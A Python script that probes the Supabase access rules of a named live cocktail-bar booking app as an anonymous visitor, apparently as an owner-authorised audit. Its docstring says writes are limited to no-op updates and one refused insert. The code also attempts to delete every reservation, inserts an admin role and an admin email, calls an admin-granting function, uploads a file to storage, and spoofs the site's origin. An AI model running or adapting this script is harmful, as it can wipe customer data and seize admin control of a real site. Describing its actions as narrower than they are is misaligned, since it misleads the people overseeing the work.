"""External RLS probe of the Loma Lovable app (owner-authorised). Anonymous visitor, public key only.
Writes are limited to no-op updates (same value) and one policy-violating insert that must be refused."""
import json, re, urllib.request, urllib.error, uuid, pathlib, datetime

env = dict(re.findall(r'^(\w+)="?([^"\n]*)"?$', pathlib.Path.home().joinpath('.hermes/cache/scratch/lovable-a4/.env').read_text(), re.M))
URL, KEY = env['VITE_SUPABASE_URL'].rstrip('/'), env['VITE_SUPABASE_PUBLISHABLE_KEY']

def req(method, path, body=None, token=None, extra=None):
    h = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0 Safari/537.36', 'Origin': 'https://loma-brussels-cocktail-club.lovable.app', 'apikey': KEY, 'Content-Type': 'application/json', 'Prefer': 'return=representation'}
    if token: h['Authorization'] = 'Bearer ' + token
    h.update(extra or {})
    r = urllib.request.Request(URL + path, data=json.dumps(body).encode() if body is not None else None, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=20) as x:
            return x.status, x.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()

out = {}
for t in ['reservations', 'newsletter_subscribers', 'user_roles', 'admin_emails', 'cocktails', 'site_settings']:
    s, b = req('GET', f'/rest/v1/{t}?select=*&limit=2')
    out[f'anon GET {t}'] = (s, b[:120])
s, b = req('GET', '/rest/v1/cocktails?select=id,name&limit=1'); c = json.loads(b)[0]
out['anon PATCH cocktail (same name)'] = req('PATCH', f"/rest/v1/cocktails?id=eq.{c['id']}", {'name': c['name']})
out['anon PATCH site_settings (no-op)'] = req('PATCH', '/rest/v1/site_settings?id=eq.1', {'id': 1})
out['anon DELETE reservations (all)'] = req('DELETE', '/rest/v1/reservations?id=not.is.null')
d = (datetime.date.today() + datetime.timedelta(days=30)).isoformat()
out['anon INSERT reservation status=confirmed'] = req('POST', '/rest/v1/reservations', {'reservation_date': d, 'reservation_time': '20:00', 'party_size': 2, 'name': 'AUDIT HORDE - a supprimer', 'email': 'audit@hordeagence.com', 'phone': '000000', 'status': 'confirmed'})
out['anon INSERT user_roles admin'] = req('POST', '/rest/v1/user_roles', {'user_id': str(uuid.uuid4()), 'role': 'admin'})
out['anon INSERT admin_emails'] = req('POST', '/rest/v1/admin_emails', {'email': 'attacker@example.com'})
out['anon RPC has_role'] = req('POST', '/rest/v1/rpc/has_role', {'_user_id': str(uuid.uuid4()), '_role': 'admin'})
out['anon RPC grant_admin_on_signup'] = req('POST', '/rest/v1/rpc/grant_admin_on_signup', {})
out['anon storage list'] = req('POST', '/storage/v1/object/list/cocktail-photos', {'prefix': '', 'limit': 5})
out['anon storage upload'] = req('POST', '/storage/v1/object/cocktail-photos/audit-horde.txt', None, extra={'Content-Type': 'text/plain'})
out['auth settings'] = req('GET', '/auth/v1/settings')
out['openapi schema'] = req('GET', '/rest/v1/')[0]
for k, v in out.items(): print(k, '->', v if isinstance(v, int) else (v[0], v[1][:160]))
